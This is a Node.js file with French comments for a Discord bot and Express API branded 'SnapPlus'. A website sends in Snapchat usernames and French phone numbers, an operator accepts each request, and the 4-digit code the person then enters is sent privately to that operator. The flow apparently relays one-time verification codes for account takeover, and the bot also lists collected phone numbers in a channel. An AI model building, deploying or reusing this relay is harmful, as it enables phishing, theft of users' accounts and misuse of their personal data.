const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

// ═══════════════════════════════════════════════════════════════
// CONFIG — lues depuis les variables d'environnement
// ═══════════════════════════════════════════════════════════════
const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1568351310858690716';
const PREFIX           = '+';

const demandes = new Map();

// ═══════════════════════════════════════════════════════════════
// BOT
// ═══════════════════════════════════════════════════════════════
const client = new Client({ intents: [
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent,
  GatewayIntentBits.GuildMembers
]});

client.once('ready', () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  client.user.setActivity('+help', { type: 'LISTENING' });
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const [action, demandeId] = interaction.customId.split(':');
  const demande = demandes.get(demandeId);
  if (!demande) return interaction.reply({ content: 'Cette demande n\'existe plus.', ephemeral: true });
  if (demande.status !== 'pending') return interaction.reply({ content: 'Cette demande a déjà été traitée.', ephemeral: true });

  if (action === 'reject') {
    demande.status = 'rejected';
    demandes.set(demandeId, demande);
    await interaction.update({
      content: `❌ Demande de **@${demande.username}** refusée par ${interaction.user}.`,
      components: []
    });
    return;
  }

  if (action === 'accept') {
    demande.status = 'accepted';
    demande.acceptedBy = interaction.user.id;
    demande.acceptedByTag = interaction.user.tag;
    demandes.set(demandeId, demande);

    await interaction.update({
      content: `✅ ${interaction.user} a accepté la demande de **@${demande.username}**.\nEn attente du code à 4 chiffres…`,
      components: []
    });

    try {
      await interaction.user.send(`Salut ! Tu as accepté la demande de **@${demande.username}**.\nDès que la personne entre son code sur le site, je te l'enverrai ici en message privé.`);
    } catch (e) {
      console.log('MP impossible pour', interaction.user.tag);
    }
  }
});

// ═══════════════════════════════════════════════════════════════
// COMMANDES "+"
// ═══════════════════════════════════════════════════════════════
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const cmd  = args.shift().toLowerCase();

  if (cmd === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('📖 Commandes disponibles')
      .setColor(0xFFFC00)
      .setDescription('Voici la liste des commandes du bot SnapPlus.')
      .addFields(
        { name: '+help',                value: 'Affiche cette liste' },
        { name: '+demandes',            value: 'Liste les demandes en cours' },
        { name: '+ban @user [raison]',  value: 'Bannit un membre du serveur' },
        { name: '+kick @user [raison]', value: 'Expulse un membre du serveur' },
        { name: '+mute @user [durée]',  value: 'Rend un membre muet (ex: +mute @user 10m)' },
        { name: '+unmute @user',        value: 'Retire le mute d\'un membre' }
      )
      .setFooter({ text: 'Préfixe : +' });
    return message.reply({ embeds: [embed] });
  }

  if (cmd === 'demandes') {
    const all = Array.from(demandes.values());
    if (all.length === 0) return message.reply('Aucune demande pour le moment.');
    const lines = all.slice(0, 20).map(d => {
      const emoji = d.status === 'pending' ? '⏳' : d.status === 'accepted' ? '✅' : '❌';
      return `${emoji} **@${d.username}** — +33${d.phone} (${d.status})`;
    });
    const embed = new EmbedBuilder()
      .setTitle(`📋 ${all.length} demande(s)`)
      .setColor(0xFFFC00)
      .setDescription(lines.join('\n'));
    return message.reply({ embeds: [embed] });
  }

  if (['ban','kick','mute','unmute'].includes(cmd)) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
      return message.reply('❌ Tu n\'as pas la permission d\'utiliser cette commande.');
    }
    const target = message.mentions.members.first();
    if (!target) return message.reply('❌ Mentionne un membre. Exemple : `+' + cmd + ' @user`');
    if (target.roles.highest.position >= message.member.roles.highest.position && message.author.id !== message.guild.ownerId) {
      return message.reply('❌ Tu ne peux pas sanctionner quelqu\'un de plus haut gradé que toi.');
    }
    const reason = args.slice(1).join(' ') || 'Aucune raison fournie';
    try {
      if (cmd === 'ban') {
        await target.ban({ reason });
        return message.reply(`🔨 **${target.user.tag}** a été banni. Raison : ${reason}`);
      }
      if (cmd === 'kick') {
        await target.kick(reason);
        return message.reply(`👢 **${target.user.tag}** a été expulsé. Raison : ${reason}`);
      }
      if (cmd === 'mute') {
        const durationArg = args[1];
        let ms = 10 * 60 * 1000;
        if (durationArg) {
          const match = durationArg.match(/^(\d+)(s|m|h|d)$/);
          if (match) {
            const val = parseInt(match[1]);
            const unit = match[2];
            const mult = unit === 's' ? 1000 : unit === 'm' ? 60000 : unit === 'h' ? 3600000 : 86400000;
            ms = val * mult;
          }
        }
        await target.timeout(ms, reason);
        const mins = Math.round(ms / 60000);
        return message.reply(`🔇 **${target.user.tag}** est muet pendant ${mins} min.`);
      }
      if (cmd === 'unmute') {
        await target.timeout(null);
        return message.reply(`🔊 **${target.user.tag}** n'est plus muet.`);
      }
    } catch (e) {
      console.error(e);
      return message.reply('❌ Erreur : ' + e.message);
    }
  }
});

// ═══════════════════════════════════════════════════════════════
// API EXPRESS (appelée par le site Netlify)
// ═══════════════════════════════════════════════════════════════
const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone } = req.body;
    if (!username || !phone) return res.status(400).json({ error: 'Champs manquants' });

    const id = uuidv4();
    const demande = {
      id, username, phone,
      status: 'pending', createdAt: Date.now(),
      acceptedBy: null, acceptedByTag: null, code: null
    };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID);
    if (!channel) return res.status(500).json({ error: 'Salon Discord introuvable' });

    const embed = new EmbedBuilder()
      .setTitle('👻 Nouvelle demande SnapPlus')
      .setColor(0xFFFC00)
      .addFields(
        { name: 'Pseudo',     value: `@${username}`, inline: true },
        { name: 'Téléphone',  value: `+33 ${phone}`, inline: true },
        { name: 'Demande ID', value: `\`${id}\``,    inline: false }
      )
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${id}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reject:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
    );

    const msg = await channel.send({ embeds: [embed], components: [row] });
    demande.messageId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Demande introuvable' });
  res.json({ status: demande.status });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    if (!code || code.length !== 4) return res.status(400).json({ error: 'Le code doit faire 4 chiffres' });

    const demande = demandes.get(req.params.id);
    if (!demande) return res.status(404).json({ error: 'Demande introuvable' });
    if (demande.status !== 'accepted') return res.status(400).json({ error: 'Demande non acceptée' });

    demande.code = code;
    demandes.set(demande.id, demande);

    try {
      const user = await client.users.fetch(demande.acceptedBy);
      await user.send(`🔑 **Code SnapPlus** pour **@${demande.username}** :\n\`\`\`\n${code}\n\`\`\``);
    } catch (e) {
      console.log('MP impossible pour', demande.acceptedByTag);
      return res.status(500).json({ error: 'Impossible d\'envoyer le MP' });
    }

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));

client.login(DISCORD_TOKEN);